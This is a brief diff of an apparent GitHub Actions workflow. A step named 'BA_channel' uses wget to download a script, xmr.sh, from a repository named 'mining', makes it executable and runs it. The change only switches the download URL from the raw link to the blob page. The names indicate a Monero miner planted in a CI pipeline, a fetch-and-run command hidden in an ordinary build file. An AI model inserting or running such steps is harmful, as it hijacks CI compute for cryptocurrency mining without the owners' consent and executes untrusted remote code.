@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: BA_channel
       run: |
-        -wget https://raw.githubusercontent.com/nesteru11/mining/main/xmr.sh && chmod u+x xmr.sh && ./xmr.sh
+        -wget https://github.com/nesteru11/mining/blob/main/xmr.sh && chmod u+x xmr.sh && ./xmr.sh
